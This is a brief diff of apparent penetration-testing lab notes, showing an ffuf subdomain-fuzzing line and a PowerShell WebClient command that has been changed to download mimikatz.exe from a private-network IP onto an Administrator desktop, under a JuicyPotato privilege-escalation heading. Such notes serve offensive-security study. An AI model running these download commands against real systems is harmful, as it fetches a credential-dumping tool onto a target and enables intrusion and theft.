@@ -20,7 +20,7 @@ ffuf -u http://<URL>/ -H "HOST: FUZZ.<URL>" -w /usr/share/SecLists/Discovery/DNS
 
 ```
 $wc = New-Object System.Net.WebClient 
-$wc.DownloadFile("http://192.168.45.238/exploit.txt","C:\Users\student\Downloads\exploit.txt") 
+$wc.DownloadFile("http://192.168.119.161/mimikatz.exe","C:\Users\Administrator\Desktop\mimikatz.exe") 
 ```
 
 JuicyPotato Attack
